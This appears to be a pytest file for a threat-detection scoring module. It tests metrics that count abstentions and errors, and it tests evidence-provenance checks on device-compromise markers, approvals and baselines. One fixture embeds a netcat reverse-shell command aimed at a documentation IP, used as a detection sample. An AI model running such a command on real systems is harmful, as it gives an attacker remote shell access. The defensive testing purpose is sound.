"""Metrics retain difficult cases; evidence checks reject altered or unrelated records."""

from copy import deepcopy
from datetime import UTC, datetime, timedelta

import pytest

from scripts.m7_context_scoring import (
    _digest,
    evidence_alignment,
    score_comparison,
)


def bare(case_id, prediction):
    answer = {"verdict": prediction}
    return {"case_id": case_id, "session_id": case_id,
            "rule_only": answer.copy(), "with_context": answer.copy()}


def reference(case_id, truth, **extra):
    return {"case_id": case_id, "label": truth, "family": "audit", **extra}


def test_conservative_denominators_keep_held_errors_and_unknowns_separate():
    pairs = [("threat", "threat"), ("threat", "normal"), ("threat", "unknown"),
             ("threat", "error"), ("normal", "threat"), ("normal", "normal"),
             ("normal", "unknown"), ("unknown", "unknown"), ("unknown", "threat"),
             ("unknown", "normal")]
    rows = [bare(str(i), prediction) for i, (_, prediction) in enumerate(pairs)]
    labels = [reference(str(i), truth) for i, (truth, _) in enumerate(pairs)]
    report = score_comparison(rows, labels)
    result = report["arms"]["with_context"]
    assert result["confusion_classified_known"] == {"tp": 1, "fp": 1, "fn": 1, "tn": 1}
    assert result["missed_threats_including_abstentions_and_errors"] == 3
    assert result["metrics"] == {"precision": .5, "recall": .25, "f1": 1 / 3,
                                  "false_positive_rate": 1 / 3}
    assert result["held_by_label"] == {"normal": 1, "threat": 1, "unknown": 1}
    assert result["errors_total"] == 1
    assert result["classified_coverage_known"] == 4 / 7
    assert result["unknown_reference"] == {"correctly_held": 1, "unsupported_normal_claims": 1,
                                           "unsupported_threat_claims": 1, "execution_errors": 0}
    assert report["project_goals_met"] is False
    assert report["independent_generalization_verified"] is False


def test_all_abstentions_do_not_become_perfect_precision_or_coverage():
    report = score_comparison([bare("a", "unknown"), bare("b", "unknown")],
                              [reference("a", "normal"), reference("b", "threat")])
    result = report["arms"]["rule_only"]
    assert result["metrics"] == {"precision": None, "recall": 0., "f1": 0.,
                                  "false_positive_rate": 0.}
    assert result["conditional_metrics"] == dict.fromkeys(
        ("precision", "recall", "f1", "false_positive_rate"), None,
    )
    assert result["classified_coverage_known"] == 0
    assert result["missed_threats_including_abstentions_and_errors"] == 1


def test_only_unknown_references_leave_binary_metrics_undefined():
    report = score_comparison([bare("a", "threat")], [reference("a", "unknown")])
    result = report["arms"]["rule_only"]
    assert result["metrics"] == dict.fromkeys(("precision", "recall", "f1", "false_positive_rate"), None)
    assert result["unknown_reference"]["unsupported_threat_claims"] == 1
    assert result["evidence_supported_detection"]["all_threat_claims"] == 1


@pytest.mark.parametrize("mutation", ["row_error", "row_error_type", "answer_error", "status_error"])
def test_runtime_failures_are_errors_even_when_placeholder_verdict_is_unknown(mutation):
    row = bare("a", "unknown")
    if mutation == "row_error":
        row["error"] = "runtime_failure"
    elif mutation == "row_error_type":
        row["error_type"] = "RuntimeError"
    elif mutation == "answer_error":
        row["with_context"]["error"] = "runtime_failure"
    else:
        row["with_context"]["status"] = "error"
    report = score_comparison([row], [reference("a", "threat")])
    result = report["arms"]["with_context"]
    assert result["errors_total"] == 1
    assert result["held_total"] == 0
    assert result["missed_threats_including_abstentions_and_errors"] == 1


def test_reference_ids_must_match_exactly_once():
    row, label = bare("a", "normal"), reference("a", "normal")
    for predictions, labels in (([row, row], [label]), ([row], [label, label]),
                                 ([row], [reference("b", "normal")]), ([], [])):
        with pytest.raises(ValueError, match="reference_alignment"):
            score_comparison(predictions, labels)


@pytest.fixture
def trusted_row():
    origin = datetime(2026, 11, 10, tzinfo=UTC)
    def at(seconds):
        return (origin + timedelta(seconds=seconds)).isoformat()
    scope = {"source": "cloudtrail", "user_id": "user-a", "device_id": "device-a",
             "resource_id": "resource-a", "action": "READ", "principal_hash": "actor-a"}
    event = {"id": "event-a", "timestamp": at(10), "resource_hashes": ["resource-a"],
             "connection_id": "connection-a", "principal_hash": "actor-a", "api_action": "GetObject"}
    activity = {"source": "cloudtrail", "original_group_id": "group-a", "events": [event]}
    capture = {"tenant_id": "tenant-a", "capture_id": "capture-a", "session_id": "session-a",
               "session_version": 1, "session_input_sha256": "a" * 64, "issued_at": at(10),
               "expires_at": at(90), "scope": scope, "activity": activity}
    historical = {"tenant_id": "tenant-a", "session_id": "session-a", "version": 1,
                  "user_id": "user-a", "device_id": "device-a", "resource_id": "resource-a",
                  "action": "READ", "input_digest_sha256": "a" * 64,
                  "signal_trust": "verified_source", "evaluated_at": at(10),
                  "status": "ACTIVE", "decision": "ALLOW", "grant_expires_at": at(50),
                  "signal_expires_at": at(90)}
    latest = historical | {"version": 2, "status": "REVOKED", "decision": "DENY"}
    marker = {"event_id": "observation-a", "tenant_id": "tenant-a", "source_id": "device",
              "key_id": "key-a", "input_digest_sha256": "b" * 64,
              "observed_at": at(11), "recorded_at": at(11), "restriction": "DENY",
              "matched_sessions": 1, "observation": {"kind": "device", "subject_id": "device-a",
                                                        "security_posture": "compromised"}}
    request = {key: marker[key] for key in ("tenant_id", "event_id", "source_id", "key_id",
                                            "observation", "observed_at")}
    request.update(schema_version="zt-observation-1", algorithm="Ed25519",
                   issued_at=at(11), expires_at=at(90))
    marker["input_digest_sha256"] = _digest(request)
    intake = {"accepted": True, "state": "completed", "event_id": marker["event_id"],
              "request": request, "observation": deepcopy(marker["observation"]),
              "input_sha256": _digest(request)}
    evidence = {key: marker[key] for key in ("event_id", "source_id", "key_id", "input_digest_sha256",
                                            "observed_at", "recorded_at")}
    evidence.update(kind="device", reason="trusted_device_compromise", historically_committed=True)
    row = {"case_id": "case-a", "session_id": "session-a", "activity_sha256": _digest(activity),
           "rule_input_sha256": _digest(activity), "context_activity_sha256": _digest(activity),
           "rule_only": {"verdict": "unknown", "reason": "missing_or_unsupported_observed_activity"},
           "with_context": {"verdict": "threat", "reason": "TRUSTED_ADVERSE_EVIDENCE",
                            "trusted_evidence": [evidence]},
           "provenance": {"capture": capture, "session_history": [historical, latest],
                          "observations": [marker], "context_records": [], "evaluation_at": at(12),
                          "observation_intake": intake}}
    return row


def test_verified_signal_is_both_traceable_and_reference_supported(trusted_row):
    label = reference("case-a", "threat", expected_support=["device"])
    result = evidence_alignment(trusted_row, label, "with_context")
    assert result["provenance_aligned"] is True
    assert result["reference_supported"] is True


@pytest.mark.parametrize("mutation", ["tenant", "device", "digest", "missing", "future", "duplicate"])
def test_unrelated_changed_or_absent_committed_marker_is_not_evidence(trusted_row, mutation):
    marker = trusted_row["provenance"]["observations"][0]
    if mutation == "tenant":
        marker["tenant_id"] = "tenant-b"
    elif mutation == "device":
        marker["observation"]["subject_id"] = "device-b"
    elif mutation == "digest":
        marker["input_digest_sha256"] = "c" * 64
    elif mutation == "missing":
        trusted_row["provenance"]["observations"] = []
    elif mutation == "future":
        marker["recorded_at"] = "2027-01-01T00:00:00+00:00"
    else:
        trusted_row["provenance"]["observations"].append(deepcopy(marker))
    result = evidence_alignment(trusted_row, reference("case-a", "threat", expected_support=["device"]),
                                "with_context")
    assert result["provenance_aligned"] is False
    assert result["reference_supported"] is False


def test_valid_marker_does_not_overrule_independent_reference(trusted_row):
    result = evidence_alignment(trusted_row, reference("case-a", "normal", expected_support=["none"]),
                                "with_context")
    assert result["provenance_aligned"] is True
    assert result["reference_supported"] is False


def test_mutating_activity_with_same_ids_breaks_capture_hash(trusted_row):
    trusted_row["provenance"]["capture"]["activity"]["events"][0]["api_action"] = "DeleteObject"
    result = evidence_alignment(trusted_row, reference("case-a", "threat", expected_support=["device"]),
                                "with_context")
    assert result["status"] == "input_provenance_mismatch"


def test_remote_shell_citation_requires_frozen_exact_content_and_same_group(trusted_row):
    event = trusted_row["provenance"]["capture"]["activity"]["events"][0]
    event["command"] = "nc 192.0.2.8 4444 -e /bin/sh"
    activity = trusted_row["provenance"]["capture"]["activity"]
    for key in ("activity_sha256", "rule_input_sha256", "context_activity_sha256"):
        trusted_row[key] = _digest(activity)
    answer = {"verdict": "threat", "reason": "explicit_remote_shell_attempt",
              "evidence_ids": [event["id"]], "findings": [{"disposition": "threat",
              "feature": "ssh_reverse_shell", "evidence_ids": [event["id"]]}]}
    trusted_row["rule_only"] = answer
    label = reference("case-a", "threat", expected_support=["remote_shell"],
                      support_event_ids=[event["id"]], support_event_sha256={event["id"]: _digest(event)})
    assert evidence_alignment(trusted_row, label, "rule_only")["reference_supported"]
    event["command"] = "echo safe"
    # Even a caller updating output hashes cannot change the separately frozen reference.
    for key in ("activity_sha256", "rule_input_sha256", "context_activity_sha256"):
        trusted_row[key] = _digest(activity)
    assert not evidence_alignment(trusted_row, label, "rule_only")["reference_supported"]
    answer["evidence_ids"] = ["other-group-event"]
    assert not evidence_alignment(trusted_row, label, "rule_only")["provenance_aligned"]


def test_equal_timestamp_serializations_match(trusted_row):
    marker = trusted_row["provenance"]["observations"][0]
    for key in ("observed_at", "recorded_at"):
        marker[key] = marker[key].replace("+00:00", "Z")
    assert evidence_alignment(trusted_row, reference("case-a", "threat", expected_support=["device"]),
                              "with_context")["reference_supported"]


@pytest.fixture
def approved_row(tmp_path):
    from scripts.m7_context_dataset import build_dataset
    from scripts.m7_context_runtime import run_case

    inputs, labels = build_dataset(repetitions=1)
    label = next(item for item in labels if item["family"] == "approved_upload")
    spec = next(item for item in inputs if item["case_id"] == label["case_id"])
    row = run_case(spec, tmp_path / "capture")
    # This module checks the historical scoring contract. The current service must
    # hold these old inputs, which contain no execution policy or observer evidence.
    # Supply a historical answer explicitly, only as a scorer unit fixture; never
    # rewrite the real service's saved evaluation or the archived 240-session files.
    assert row["with_context"]["verdict"] == "unknown"
    assert row["with_context"]["reason"] == "EXECUTION_POLICY_REQUIRED"
    row["with_context"].update(
        verdict="normal", reason="APPROVED_BASELINE_MATCH",
        baseline_id=spec["baseline"]["id"], approval_id=spec["approval"]["id"],
    )
    return row, label


def test_historical_baseline_and_approval_claim_is_independently_supported(approved_row):
    row, label = approved_row
    result = evidence_alignment(row, label, "with_context")
    assert result["provenance_aligned"] is True
    assert result["reference_supported"] is True


@pytest.mark.parametrize("mutation", ["wrong_id", "scope", "late", "expired", "revoked", "used",
                                      "changed_profile", "new_resource"])
def test_invalid_or_changed_approval_cannot_support_normal_claim(approved_row, mutation):
    row, label = approved_row
    provenance = row["provenance"]
    records = provenance["context_records"]
    approval = next(item for item in records if item["kind"] == "approval")
    baseline = next(item for item in records if item["kind"] == "baseline")
    if mutation == "wrong_id":
        row["with_context"]["approval_id"] = "other-approval"
    elif mutation == "scope":
        approval["payload"]["scope"]["device_id"] = "other-device"
    elif mutation == "late":
        approval["created_at"] = provenance["evaluation_at"]
    elif mutation == "expired":
        approval["payload"]["request"]["valid_until"] = provenance["evaluation_at"]
    elif mutation == "revoked":
        records.append({"kind": "revocation", "tenant_id": approval["tenant_id"],
                        "record_id": "revocation-a", "created_at": approval["created_at"],
                        "payload": {"target_kind": "approval", "target_id": approval["record_id"]}})
    elif mutation == "used":
        records.append({"kind": "evaluation", "tenant_id": approval["tenant_id"],
                        "record_id": "prior-use", "created_at": approval["created_at"],
                        "payload": {"capture_id": "another-capture", "verdict": "normal",
                                    "approval_id": approval["record_id"]}})
    elif mutation == "changed_profile":
        baseline["payload"]["profile"]["max_events"] += 1
        approval["payload"]["baseline_digest"] = _digest(baseline["payload"])
    else:
        activity = provenance["capture"]["activity"]
        activity["events"][0]["resource_hashes"] = ["unseen-resource"]
        for key in ("activity_sha256", "rule_input_sha256", "context_activity_sha256"):
            row[key] = _digest(activity)
    assert not evidence_alignment(row, label, "with_context")["provenance_aligned"]


def test_false_missing_context_explanation_rejected_when_approval_exists(approved_row):
    row, label = approved_row
    row["with_context"].update(verdict="unknown", reason="CONTEXT_REQUIRED")
    assert not evidence_alignment(row, label, "with_context")["provenance_aligned"]


def test_matching_id_with_changed_observation_content_cannot_pass(trusted_row):
    marker = trusted_row["provenance"]["observations"][0]
    marker["observation"]["managed"] = False
    assert not evidence_alignment(trusted_row, reference("case-a", "threat", expected_support=["device"]),
                                  "with_context")["provenance_aligned"]


def test_rejected_report_cannot_be_promoted_to_committed_evidence(trusted_row):
    trusted_row["provenance"]["observation_intake"]["accepted"] = False
    assert not evidence_alignment(trusted_row, reference("case-a", "threat", expected_support=["device"]),
                                  "with_context")["provenance_aligned"]


def test_abstention_reason_cannot_hide_scoped_committed_compromise(trusted_row):
    trusted_row["with_context"].update(verdict="unknown", reason="SESSION_NOT_ELIGIBLE")
    assert not evidence_alignment(trusted_row, reference("case-a", "threat", expected_support=["device"]),
                                  "with_context")["provenance_aligned"]
